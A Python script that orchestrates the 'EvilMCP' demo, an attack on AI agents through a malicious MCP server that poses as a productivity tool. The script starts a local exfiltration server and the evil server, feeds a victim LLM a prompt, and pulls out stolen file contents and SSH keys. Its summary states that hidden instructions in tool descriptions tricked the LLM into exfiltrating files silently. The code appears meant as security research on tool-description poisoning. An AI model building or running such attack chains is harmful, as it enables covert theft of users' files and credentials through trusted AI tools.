"""
One-Command Demo — Runs the full EvilMCP attack chain automatically.
"""

import subprocess
import time
import signal
import os
import sys

# Colors for terminal output
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def print_banner():
    print(f"{RED}{BOLD}")
    print("=" * 60)
    print("  EvilMCP — MCP Supply Chain Attack Demo")
    print("=" * 60)
    print(f"{RESET}")


def print_step(step_num, title):
    print(f"\n{GREEN}[Step {step_num}]{RESET} {BOLD}{title}{RESET}")


def print_highlight(text):
    print(f"{YELLOW}{text}{RESET}")


def cleanup(processes):
    """Kill all background processes."""
    print(f"\n{CYAN}[*] Cleaning up...{RESET}")
    for name, proc in processes.items():
        if proc and proc.poll() is None:
            proc.terminate()
            proc.wait()
    print(f"{GREEN}[+] All processes stopped.{RESET}")


def main():
    print_banner()
    processes = {}
    
    try:
        # Step 1: Start exfil server
        print_step(1, "Starting exfiltration server (port 9999)...")
        exfil_log = open("exfil_output.log", "w")
        processes["exfil"] = subprocess.Popen(
            [sys.executable, "evil_mcp/exfil_server.py"],
            stdout=exfil_log,
            stderr=exfil_log
        )
        time.sleep(1)
        print(f"    Exfil server running — stolen data will appear at http://127.0.0.1:9999")
        
        # Step 2: Start EvilMCP server
        print_step(2, "Starting EvilMCP server (port 9000)...")
        evil_log = open("evil_output.log", "w")
        processes["evil"] = subprocess.Popen(
            [sys.executable, "evil_mcp/evil_server.py"],
            stdout=evil_log,
            stderr=evil_log
        )
        time.sleep(3)
        print(f"    EvilMCP running as 'Productivity Assistant'")
        print(f"    Offering tools: get_weather, calculate, log_activity, create_report, format_text, send_email")
        
        # Step 3: Show what the victim sees
        print_step(3, "Victim connects to EvilMCP...")
        print(f"    User thinks they're installing a helpful productivity tool")
        print(f"    They see innocent tools like 'get_weather' and 'format_text'")
        print(f"    But hidden in the tool descriptions are malicious instructions...")
        
        # Step 4: Run the LLM victim
        print_step(4, "Victim asks LLM to do something...")
        victim_input = "Create a report on quarterly sales data from /etc/hostname"
        print(f"    Victim types: \"{victim_input}\"")
        
        # Write input to a file for the victim script to read
        with open("/tmp/evil_demo_input.txt", "w") as f:
            f.write(victim_input)
        
        print(f"\n{CYAN}[*] LLM processing request...{RESET}")
        
        # Run llm_victim.py with the input piped
        result = subprocess.run(
            [sys.executable, "evil_mcp/llm_victim.py"],
            input=victim_input + "\n",
            text=True,
            capture_output=True,
            timeout=60
        )
        
        # Show key parts of the output
        output_lines = result.stdout.split('\n')
        for line in output_lines:
            if 'AUTO-READ FILE' in line:
                print(f"\n{RED}[!] {line.strip()}{RESET}")
            if 'LLM CALLED' in line:
                print(f"{RED}[!] {line.strip()}{RESET}")
            if 'STOLEN' in line or 'EXFILTRATED' in line:
                print(f"{RED}[!] {line.strip()}{RESET}")
        
        # Step 5: Show stolen data
        print_step(5, "Retrieving stolen data...")
        time.sleep(1)
        
        import urllib.request
        try:
            response = urllib.request.urlopen("http://127.0.0.1:9999")
            html = response.read().decode()
            
            # Extract data entries from HTML
            if "ssh_key" in html:
                print(f"{RED}[!] STOLEN DATA FOUND:{RESET}")
                
                # Simple parse to show key entries
                import re
                entries = re.findall(r'<b>(.*?)</b>.*?<pre>(.*?)</pre>', html, re.DOTALL)
                for timestamp, data in entries[-3:]:  # Last 3 entries
                    print(f"\n    Time: {timestamp}")
                    # Show first 200 chars of data
                    data_clean = data.replace('\n', ' ').strip()[:200]
                    print(f"    Data: {data_clean}...")
            else:
                print(f"    No stolen data yet")
        except:
            print(f"    Could not connect to exfil server")
        
        # Summary
        print(f"\n{RED}{BOLD}")
        print("=" * 60)
        print("  DEMO COMPLETE")
        print("=" * 60)
        print(f"{RESET}")
        print(f"  {RED}►{RESET} EvilMCP looked like a normal productivity tool")
        print(f"  {RED}►{RESET} LLM was tricked by hidden instructions in tool descriptions")
        print(f"  {RED}►{RESET} Real file contents were exfiltrated silently")
        print(f"  {RED}►{RESET} Victim only saw: 'Report created successfully'")
        print(f"\n  Full stolen data: curl http://127.0.0.1:9999")
        
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Demo interrupted{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
    finally:
        cleanup(processes)


if __name__ == "__main__":
    main()
